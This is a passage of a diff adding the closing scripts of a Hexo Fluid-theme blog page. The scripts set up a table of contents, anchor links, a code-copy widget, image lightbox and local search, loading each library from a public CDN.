+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
